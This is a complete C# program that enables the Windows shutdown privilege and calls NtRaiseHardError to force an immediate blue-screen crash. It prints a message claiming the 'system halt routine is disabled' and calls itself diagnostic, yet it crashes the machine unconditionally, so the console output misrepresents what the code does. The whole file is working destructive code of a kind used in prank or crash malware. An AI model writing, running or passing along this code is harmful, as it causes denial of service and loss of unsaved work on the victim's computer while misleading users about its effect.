using System;
using System.Runtime.InteropServices;
class Program
{
    public static void Main(string[] args)
    {
        Console.WriteLine("System halt routine is disabled.");
        TriggerSystemHalt();
    }

    [DllImport("ntdll.dll")]
    private static extern uint NtRaiseHardError(
        uint errorStatus,
        uint numberOfParameters,
        uint unicodeStringParameterMask,
        IntPtr parameters,
        uint validResponseOptions,
        out uint response
    );

    [DllImport("ntdll.dll")]
    private static extern uint RtlAdjustPrivilege(
        int privilege,
        bool bEnablePrivilege,
        bool bCurrentThread,
        out bool oEnabled
    );

    public static void TriggerSystemHalt()
    {
        uint status = RtlAdjustPrivilege(19, true, false, out bool wasEnabled);
        if (status == 0)
        {
            uint errorStatus = 0xC0000420; 
            
            uint numberOfParameters = 0;
            uint unicodeStringParameterMask = 0;
            IntPtr parameters = IntPtr.Zero; 
            
            uint validResponseOptions = 6; 
            NtRaiseHardError(
                errorStatus, 
                numberOfParameters, 
                unicodeStringParameterMask, 
                parameters, 
                validResponseOptions, 
                out uint response
            );
        }
        else
        {
            Console.WriteLine("Failed to acquire SeShutdownPrivilege. Diagnostic execution aborted.");
        }
    }
}
